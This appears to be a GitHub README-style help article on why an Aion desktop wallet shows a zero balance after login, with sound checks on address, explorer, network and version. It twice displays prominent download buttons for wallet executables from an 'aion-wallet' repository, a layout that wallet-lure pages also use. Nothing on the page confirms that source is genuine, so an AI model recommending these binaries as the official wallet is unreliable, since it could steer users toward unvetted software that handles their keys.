![Aion Wallet](assets/banner-article.png)

# Aion wallet zero balance after login

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

A zero balance after a successful login almost always means the wallet is reading a different account, a different network or an unfinished sync rather than a lost balance, because the coins live at an address on the chain and opening a wallet cannot move them.

Working out which of those three it is takes about two minutes, and the answer decides whether you have a restore problem or a connection problem. The order below moves from the cheapest check to the most disruptive.

## You'll see this if

- The password is accepted and the wallet opens, but the balance reads 0 or shows a dash.
- A restored wallet shows an address you do not recognise.
- The history is empty even though you know the account has been used.
- A transfer you expected has not appeared after a reasonable wait.

If the application never finishes connecting, start with the [Aion wallet not syncing](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-not-syncing.md) guide instead, because a stalled connection produces exactly this screen.

## Check one: which address is open

Open the receive screen and compare the address with the one you expect. This is the single most useful check and the one most often skipped.

A wallet restored from a phrase that belonged to a different application produces a valid wallet at a different address. A wallet restored from a keystore file opens the single account that file holds, which may not be the account you funded. A wallet imported twice can end up with two accounts, and the one on screen may be the empty one.

If the address is wrong, the balance is not missing; you are looking at a different account. The [Aion wallet login options](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-login-options.md) guide explains which credential restores which kind of account.

## Check two: what the chain says

Look the address up on a block explorer. This separates the two remaining causes in one step.

If the explorer shows the balance you expect, the account is funded and the application is failing to read it: a connection, an endpoint, or a local data problem. If the explorer also shows nothing, the address really does hold nothing, and the question becomes where the coins went rather than why the wallet cannot see them.

An explorer is also the fastest way to confirm a deposit that has not appeared yet. A transaction that is confirmed on chain but absent from the wallet is a display problem, not a loss.

## Check three: which network

A wallet can be pointed at a chain other than the one holding your funds. Aion mainnet uses chain ID 256, and a build configured for a different network will open the same address on a chain where it has no history.

This is rare in a default installation and common after a manual configuration change or a restored profile from another machine. The [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) article lists the identifiers a correct configuration uses.

## Check four: the version

Update to the current release before deeper debugging. Balance display, endpoint handling and account discovery have all changed across builds, and a wallet that was installed years ago can be reading a service that no longer answers.

After updating, reopen the wallet and give it a minute to reach a node. If the balance appears, the cause was the build rather than the account.

## If the balance is still zero

Restore the wallet from its seed phrase into the current release on the same machine, using the restore option rather than creating a new wallet. This rebuilds the local wallet from the phrase and is the cleanest way to rule out a damaged profile.

If the restored address differs from the funded one, the phrase belongs to another wallet and the funded account needs its own keystore file. If the address matches and the explorer shows funds, the installation is the problem: reinstall, restore, and check again.

Nothing in this sequence requires sending a phrase, a keystore file or a password to anyone. Any request for them is a theft attempt, and the [Aion wallet support](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-support.md) article describes what legitimate help looks like.

## Prevention

Write the address down next to the backup. A restore is much easier to verify when you know which address it should produce.

Export a keystore file for each account you actually use, so a phrase problem and a file problem remain separate failures.

Update on a schedule rather than after a scare, and check the release page for the current version instead of assuming the build you have is the newest.

## Frequently asked questions

### Can a wallet show zero while the coins are still there?

Yes. The balance is fetched from a node, so a wrong endpoint or a stalled connection shows zero for an account that is fully funded.

### I restored from my phrase and got a different address. Is my money gone?

No. The phrase restored a different wallet. The funded account needs the phrase or keystore file that created it.

### Does an empty history mean the account was emptied?

Not necessarily. History is loaded from a node as well, and it can lag or fail while the balance is correct.

### Should I reinstall first or restore first?

Restore into the current release first. Reinstalling without a working backup is the one step that can turn a display problem into a loss.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion wallet not syncing](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-not-syncing.md) - the connection side of an empty screen.
- [Aion wallet transaction history](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-transaction-history.md) - history that lags or disappears.
- [Aion keystore file restore](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-keystore-file-restore.md) - opening a single account from a file.
- [Aion desktop wallet migration](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-desktop-wallet-migration.md) - when the funds sit in an older client.
